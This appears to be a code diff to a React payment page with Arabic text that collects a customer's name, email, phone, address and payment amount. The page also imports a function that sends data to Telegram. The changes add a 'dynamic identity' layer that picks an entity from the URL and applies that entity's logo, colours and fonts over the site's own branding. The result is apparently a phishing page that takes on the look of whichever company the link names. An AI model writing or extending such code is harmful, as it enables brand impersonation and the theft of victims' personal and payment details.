@@ -12,10 +12,12 @@ import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck, CreditCard } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import BrandedCarousel from "@/components/BrandedCarousel";
-import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 import PageLoader from "@/components/PageLoader";
 
 const PaymentRecipient = () => {
@@ -23,6 +25,11 @@ const PaymentRecipient = () => {
   const navigate = useNavigate();
   const { data: linkData, isLoading, isError, error } = useLink(id);
   const updateLink = useUpdateLink();
+
+  // Apply dynamic identity based on URL/payload entity
+  useAutoApplyIdentity();
+  const { currentEntity: dynamicEntity, identity: dynamicIdentity } = useDynamicIdentity();
+
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
@@ -90,9 +97,10 @@ const PaymentRecipient = () => {
   const detectedEntity = detectEntityFromURL();
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
   const displayLogo = entityLogo || branding.logo;
-  
-  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
+
+  // Priority: Dynamic Identity > Company Branding > Service Branding
+  const primaryColor = dynamicIdentity?.colors?.primary || companyBranding?.colors?.primary || branding.colors.primary;
+  const secondaryColor = dynamicIdentity?.colors?.secondary || companyBranding?.colors?.secondary || branding.colors.secondary;
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -219,12 +227,14 @@ const PaymentRecipient = () => {
       <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
 
       {/* Main Content */}
-      <div 
+      <div
         className="min-h-screen py-8 sm:py-12"
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
-          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+          background: dynamicIdentity?.colors?.background
+            ? `linear-gradient(135deg, ${dynamicIdentity.colors.background}, #FFFFFF)`
+            : `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
+          fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
         }}
       >
         <div className="container mx-auto px-4 max-w-2xl">
@@ -328,7 +338,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                     }}
                     placeholder="أدخل اسمك الكامل"
                   />
@@ -362,7 +372,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                     }}
                     placeholder="example@email.com"
                     dir="ltr"
@@ -397,7 +407,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                     }}
                     placeholder={`${phoneCode} ${phonePlaceholder}`}
                     dir="ltr"
@@ -431,7 +441,7 @@ const PaymentRecipient = () => {
                     style={{
                       borderRadius: '12px',
                       borderColor: designSystem.colors.neutral[200],
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                      fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                     }}
                     placeholder="أدخل عنوان السكن بالتفصيل"
                   />
@@ -466,7 +476,7 @@ const PaymentRecipient = () => {
                       style={{
                         borderRadius: '12px',
                         borderColor: designSystem.colors.neutral[200],
-                        fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                        fontFamily: dynamicIdentity?.fonts?.[0] || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                       }}
                       placeholder="أدخل المبلغ"
                     />
